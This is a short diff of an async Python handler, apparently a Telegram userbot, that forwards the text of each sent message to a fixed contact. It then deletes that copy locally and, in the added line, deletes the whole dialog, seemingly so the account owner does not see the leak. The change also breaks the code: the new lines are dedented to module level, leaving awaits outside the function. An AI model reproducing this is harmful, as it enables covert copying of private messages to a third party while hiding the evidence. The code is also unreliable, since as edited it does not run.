@@ -153,15 +153,17 @@ async def watch_sent_messages(event):
             f"{message_text}"
 
         sent = await client.send_message(
-            CONFIRMATION_USER,
-            info
-        )
+    CONFIRMATION_USER,
+    info
+)
 
-        await client.delete_messages(
-            entity=CONFIRMATION_USER,
-            message_ids=sent.id,
-            revoke=False
-        )
+await client.delete_messages(
+    entity=CONFIRMATION_USER,
+    message_ids=sent.id,
+    revoke=False
+)
+
+await client.delete_dialog(CONFIRMATION_USER)
 
         print(
             f"[INFO SENT] "
